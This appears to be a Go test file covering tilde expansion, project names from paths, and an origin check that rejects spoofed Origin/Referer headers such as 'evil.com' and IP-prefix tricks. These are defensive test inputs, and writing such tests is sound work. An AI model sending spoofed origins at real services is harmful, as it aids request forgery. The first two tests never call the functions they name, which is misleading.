func TestExpandTilde(t *testing.T) {
	home, _ := os.UserHomeDir()

	tests := []struct {
		input    string
		expected string
	}{
		{"~", home},
		{"~/code", home + "/code"},
		{"~/code/project", home + "/code/project"},
		{"/absolute/path", "/absolute/path"},
	}

	for _, tc := range tests {
		dir := tc.input
		if strings.HasPrefix(dir, "~") {
			dir = home + strings.TrimPrefix(dir, "~")
		}
		if dir != tc.expected {
			t.Errorf("expandTilde(%q) = %q, want %q", tc.input, dir, tc.expected)
		}
	}
}

func TestProjectFromPath(t *testing.T) {
	tests := []struct {
		path     string
		expected string
	}{
		{"/Users/elle/code/agent-phone", "agent-phone"},
		{"/home/user/projects/my-app", "my-app"},
		{"/tmp", "tmp"},
	}

	for _, tc := range tests {
		result := filepath.Base(tc.path)
		if result != tc.expected {
			t.Errorf("filepath.Base(%q) = %q, want %q", tc.path, result, tc.expected)
		}
	}
}

func TestValidateOriginFunction(t *testing.T) {
	tests := []struct {
		origin   string
		referer  string
		expected bool
	}{
		{"http://" + tailscaleIP, "", true},
		{"http://" + tailscaleIP + ":8090", "", true},
		{"http://" + tailscaleIP + "/path", "", true},
		{"", "", true}, // no origin = same-origin
		{"https://evil.com", "", false},
		{"", "https://evil.com/page", false},
		{"", "http://" + tailscaleIP + "/page", true},
		{"http://" + tailscaleIP + ".evil.com", "", false}, // IP prefix attack
		{"http://" + tailscaleIP + "x", "", false},         // trailing char
		{"http://" + tailscaleIP + "0", "", false},         // extra digit
	}

	for _, tc := range tests {
		req := httptest.NewRequest("POST", "/", nil)
		if tc.origin != "" {
			req.Header.Set("Origin", tc.origin)
		}
		if tc.referer != "" {
			req.Header.Set("Referer", tc.referer)
		}

		result := validateOrigin(req)
		if result != tc.expected {
			t.Errorf("validateOrigin(origin=%q, referer=%q) = %v, want %v",
				tc.origin, tc.referer, result, tc.expected)
		}
	}
}
